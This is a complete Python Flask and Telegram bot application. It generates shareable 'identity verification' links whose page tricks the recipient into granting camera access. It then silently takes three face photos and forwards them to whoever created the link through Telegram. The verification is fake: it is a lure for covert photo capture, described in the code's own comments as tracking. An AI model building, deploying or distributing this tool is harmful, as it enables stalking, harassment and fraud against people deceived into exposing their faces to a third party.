import os
import uuid
import base64
from io import BytesIO
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string
from telegram import Bot, Update
from telegram.ext import Updater, CommandHandler

# Configuration
TOKEN = os.getenv('TELEGRAM_TOKEN')
DOMAIN = os.getenv('SERVER_URL') 
SECRET_KEY = os.getenv('SECRET_KEY', str(uuid.uuid4()))

# Database (Replace with Redis/Postgres in production)
db = {
    'links': {},       # {link_id: {owner_id, created_at, active}}
    'captures': {},    # {link_id: [photos]}
    'analytics': {}    # {link_id: {device_info, timestamps}}
}

app = Flask(__name__)
bot = Bot(token=TOKEN)

# ======================
# Core Functionality
# ======================

@app.route('/capture/<link_id>')
def capture_page(link_id):
    """Minimal capture page with optimized permission flow"""
    if link_id not in db['links']:
        return "Invalid verification link", 404

    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Identity Verification</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body { 
                font-family: Arial, sans-serif;
                text-align: center;
                padding: 20px;
                background: #f5f5f5;
            }
            #verification-box {
                background: white;
                border-radius: 10px;
                padding: 30px;
                max-width: 500px;
                margin: 0 auto;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            }
            #camera-feed { 
                width: 100%;
                border-radius: 8px;
                margin: 15px 0;
                display: none;
            }
            button {
                background: #4285f4;
                color: white;
                border: none;
                padding: 12px 20px;
                border-radius: 5px;
                font-size: 16px;
                cursor: pointer;
            }
            #status { margin: 15px 0; color: #666; }
        </style>
    </head>
    <body>
        <div id="verification-box">
            <h2>Identity Verification</h2>
            <div id="status">Please allow camera access to continue</div>
            <video id="camera-feed" autoplay playsinline></video>
            <button id="start-btn">Begin Verification</button>
        </div>

        <script>
            const config = {
                linkId: '{{ link_id }}',
                captureCount: 3,
                delayBetween: 2000,
                totalTimeout: 30000
            };

            let stream = null;
            let captures = 0;

            document.getElementById('start-btn').addEventListener('click', async () => {
                try {
                    // Request camera access
                    stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: 'user' },
                        audio: false
                    });
                    
                    // Show camera feed
                    const video = document.getElementById('camera-feed');
                    video.srcObject = stream;
                    video.style.display = 'block';
                    
                    // Start automated capture
                    document.getElementById('status').textContent = 'Verification in progress...';
                    document.getElementById('start-btn').style.display = 'none';
                    
                    // Begin capture sequence
                    const interval = setInterval(() => {
                        if (captures >= config.captureCount) {
                            clearInterval(interval);
                            completeVerification();
                            return;
                        }
                        capturePhoto();
                        captures++;
                    }, config.delayBetween);

                    // Initial capture
                    capturePhoto();
                    captures++;

                } catch (error) {
                    document.getElementById('status').textContent = 'Error: ' + error.message;
                }
            });

            function capturePhoto() {
                const video = document.getElementById('camera-feed');
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                // Send to server
                fetch('/save-capture/' + config.linkId, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        photo: canvas.toDataURL('image/jpeg'),
                        timestamp: new Date().toISOString()
                    })
                });
            }

            function completeVerification() {
                document.getElementById('status').textContent = 'Verification complete!';
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                }
                
                // Notify server
                fetch('/complete/' + config.linkId, { method: 'POST' });
                
                // Close after delay
                setTimeout(() => {
                    window.close();
                }, 2000);
            }
        </script>
    </body>
    </html>
    ''', link_id=link_id)

# ======================
# Server Endpoints
# ======================

@app.route('/save-capture/<link_id>', methods=['POST'])
def save_capture(link_id):
    """Save captured photo and analytics"""
    if link_id not in db['links']:
        return jsonify({"status": "error"}), 404

    data = request.json
    image_data = data['photo'].split(',')[1]
    
    # Store in database
    if link_id not in db['captures']:
        db['captures'][link_id] = []
    
    db['captures'][link_id].append({
        'timestamp': datetime.now(),
        'image_data': image_data
    })

    # Send to Telegram
    owner_id = db['links'][link_id]['owner_id']
    bot.send_photo(
        chat_id=owner_id,
        photo=BytesIO(base64.b64decode(image_data)),
        caption=f"New capture from {link_id}"
    )

    return jsonify({"status": "success"})

# ======================
# Telegram Bot
# ======================

def start_bot(update: Update, context):
    """Generate new tracking link"""
    user_id = update.effective_user.id
    link_id = str(uuid.uuid4())
    
    db['links'][link_id] = {
        'owner_id': user_id,
        'created_at': datetime.now(),
        'active': True
    }

    update.message.reply_text(
        f"🔗 Your verification link:\n\n"
        f"{DOMAIN}/capture/{link_id}\n\n"
        f"Share this link with the person you want to verify."
    )

# ======================
# Deployment Setup
# ======================

if __name__ == '__main__':
    # Start Telegram bot
    updater = Updater(TOKEN)
    updater.dispatcher.add_handler(CommandHandler('start', start_bot))
    updater.start_polling()

    # Start Flask server
    app.run(host='0.0.0.0', port=int(os.getenv('PORT', 5000)))
